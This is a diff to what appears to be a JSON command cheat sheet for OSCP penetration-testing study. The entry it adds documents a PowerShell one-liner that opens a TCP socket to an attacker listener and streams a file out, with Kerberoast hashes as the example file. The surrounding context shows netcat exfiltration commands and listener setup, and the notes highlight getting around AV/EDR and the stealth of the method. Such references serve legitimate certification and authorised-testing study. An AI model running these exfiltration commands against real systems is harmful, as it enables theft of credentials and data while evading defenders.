@@ -138,6 +138,83 @@
       ],
       "notes": "OSCP METHODOLOGY: Simple, universal file exfiltration when HTTP/SMB unavailable. Works with just netcat - no web server required. Perfect for quick one-off transfers or restricted environments.\n\nMANUAL ALTERNATIVE: Could use telnet or /dev/tcp, but nc is most common.\n\nLISTENER COMMAND: On Kali, start receiver FIRST: nc -lvnp <PORT> > received_file.txt\n\nEXAM TIP: Ensure listener running before sending file. Connection is one-shot - closes after transfer. For multiple files, restart listener each time. Verify integrity with md5sum on both sides.\n\nWINDOWS POWERSHELL: PowerShell does NOT support < redirection. Use piping instead:\n- Get-Content file.txt | nc.exe <IP> <PORT>\n- type file.txt | nc.exe <IP> <PORT> (shorter)\n- cmd /c \"nc.exe <IP> <PORT> < file.txt\" (runs in cmd.exe)\n\nWINDOWS CMD.EXE: Supports < redirection directly: nc.exe <IP> <PORT> < file.txt\n\nBINARY FILES: Works perfectly for binary files - netcat is protocol-agnostic. Use same command for executables, images, archives.\n\nNO PROGRESS: No transfer progress indicator - you won't know when complete. Check listener output for file growth.\n\nTIME ESTIMATE: Limited by network bandwidth, typically 1-10MB/sec on local network. Near-instant for small text files.",
       "oscp_relevance": "high"
+    },
+    {
+      "id": "ft-powershell-tcp-send",
+      "name": "PowerShell: Pure TCP Send File",
+      "category": "file-transfer",
+      "subcategory": "netcat",
+      "command": "$client = New-Object System.Net.Sockets.TcpClient(\"<LHOST>\", <LPORT>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content <FILE> | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()",
+      "description": "Send file via pure PowerShell TCP socket (no external tools, works when nc.exe unavailable)",
+      "tags": [
+        "FILE_TRANSFER",
+        "POWERSHELL",
+        "WINDOWS",
+        "UPLOAD",
+        "OSCP:MEDIUM",
+        "LIVING_OFF_THE_LAND"
+      ],
+      "variables": [
+        {
+          "name": "<LHOST>",
+          "description": "Attack machine IP with listener",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<LPORT>",
+          "description": "Port with listener (nc, ncat, etc.)",
+          "example": "4444",
+          "required": true
+        },
+        {
+          "name": "<FILE>",
+          "description": "File to send from Windows target",
+          "example": ".\\hashes.kerberoast",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "New-Object System.Net.Sockets.TcpClient": "Creates TCP client object - native PowerShell, no external dependencies. Opens connection to specified IP:port",
+        "GetStream()": "Gets network stream from TCP connection - provides read/write capabilities",
+        "New-Object System.IO.StreamWriter": "Creates text writer for sending data - handles line-by-line writing efficiently",
+        "Get-Content": "Reads file content line-by-line - PowerShell native cmdlet, works with text files",
+        "ForEach-Object { $writer.WriteLine($_) }": "Writes each line to TCP stream - $_ represents current line in pipeline",
+        "$writer.Flush()": "Forces buffered data to send immediately - ensures all data transmitted before closing",
+        "$client.Close()": "Closes TCP connection cleanly - signals end of transmission to receiver"
+      },
+      "success_indicators": [
+        "No error output",
+        "Command completes and returns to prompt",
+        "File appears on listener side",
+        "Listener connection closes after transfer"
+      ],
+      "failure_indicators": [
+        "Exception calling 'TcpClient' - no listener or wrong IP/port",
+        "Connection refused - firewall blocking or no listener running",
+        "Access denied - cannot read source file",
+        "Network path not found - routing or firewall issue"
+      ],
+      "troubleshooting": {
+        "Connection refused": "Ensure listener running on Kali: nc -lvnp <PORT> > output_file",
+        "Cannot find path": "Use full path or .\\relative\\path for current directory files. Check: Test-Path <FILE>",
+        "Binary file corrupted": "This method is for TEXT files only. For binary files, use ft-powershell-upload or ft-smb-upload instead",
+        "Encoding issues": "Non-ASCII characters may corrupt. Use [System.Text.Encoding]::UTF8 for encoding control",
+        "Large file hangs": "For files >10MB, consider chunked transfer or alternative method like ft-powershell-upload"
+      },
+      "prerequisites": [
+        "ft-nc-receive"
+      ],
+      "alternatives": [
+        "ft-nc-send",
+        "ft-powershell-upload",
+        "ft-smb-upload"
+      ],
+      "next_steps": [
+        "ft-file-verify-md5"
+      ],
+      "notes": "OSCP METHODOLOGY: Use when nc.exe is not available on Windows target but PowerShell is accessible. Pure PowerShell solution - no external binaries needed. Works in constrained environments where only PowerShell is allowed.\n\nWHEN TO USE:\n- nc.exe not on target system\n- Execution policy blocks downloading nc.exe\n- AV/EDR blocks netcat binaries\n- Need living-off-the-land approach\n\nLISTENER COMMAND: On Kali: nc -lvnp <PORT> > received_file.txt\n\nTEXT FILES ONLY: This method uses WriteLine() which is designed for text. For binary files (executables, images, zip files), use ft-powershell-upload (HTTP POST) or ft-smb-upload instead.\n\nEXAM TIP: Start listener BEFORE running PowerShell command. Can paste entire one-liner into PowerShell prompt. For multi-line version (easier to read/debug), separate commands with semicolons or newlines.\n\nMULTI-LINE VERSION:\n$client = New-Object System.Net.Sockets.TcpClient(\"<LHOST>\", <LPORT>)\n$stream = $client.GetStream()\n$writer = New-Object System.IO.StreamWriter($stream)\nGet-Content <FILE> | ForEach-Object { $writer.WriteLine($_) }\n$writer.Flush()\n$client.Close()\n\nVS NETCAT: No external dependencies, but text-only. Use nc.exe if available for binary support.\n\nVS HTTP UPLOAD: TCP is simpler (just listener needed), but HTTP upload (ft-powershell-upload) works better for binary files and large transfers.\n\nSTEALTH: Pure PowerShell TCP - no suspicious binary execution. Blends with normal PowerShell activity.\n\nTIME ESTIMATE: 5-30 seconds for typical text files (<5MB). Slower than nc.exe due to PowerShell overhead.",
+      "oscp_relevance": "medium"
     }
   ]
 }
